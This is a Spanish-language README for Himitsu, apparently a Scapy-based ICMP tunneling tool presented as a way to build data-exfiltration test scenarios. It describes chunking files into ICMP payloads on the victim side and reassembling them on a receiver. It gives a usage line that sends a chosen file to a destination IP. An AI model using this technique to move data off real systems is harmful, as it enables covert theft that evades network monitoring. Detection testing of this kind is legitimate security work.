# Himitsu | ICMP Tunneling

![](https://raw.githubusercontent.com/NaotaClone/Himitsu/main/Himitsu.png)


Himitsu es una herramienta creada con Scapy cuyo propósito es facilitar la generación de escenarios de pruebas para la exfiltración de datos entre estaciones utilizando el protocolo de red ICMP. Esta herramienta se encarga de dividir archivos de cualquier tipo en bloques de 60 bytes, los cuales son insertados en el campo de datos de los paquetes ICMP mediante el script "Segmentador.py" (desde la perspectiva de la víctima). Esto permite enviar imágenes, binarios, diccionarios u otro tipo de información relevante para las pruebas. Por otro lado, en la máquina receptora de la información, los paquetes ICMP son recibidos y posteriormente ensamblados mediante el script "Ensamblador.py", lo que permite reconstruir el archivo final extrayendo las cadenas recibidas en el campo de datos.

```bash
  Cabe destacar que antes de realizar la ejecución debe contar con Python3 & Scapy instalados en ambos sistemas.
```

## Instrucciones de uso

### HT-Segment.py - Segmentador de archivos.
```bash
  HT-Segment.py <Nombre del Archivo a Enviar> <Dirección IP de Destino>
```
### HT-Assembler.py - Ensamblador de archivos.
```bash
  HT-Assembler.py <Nombre del Archivo a Ensamblar>
```
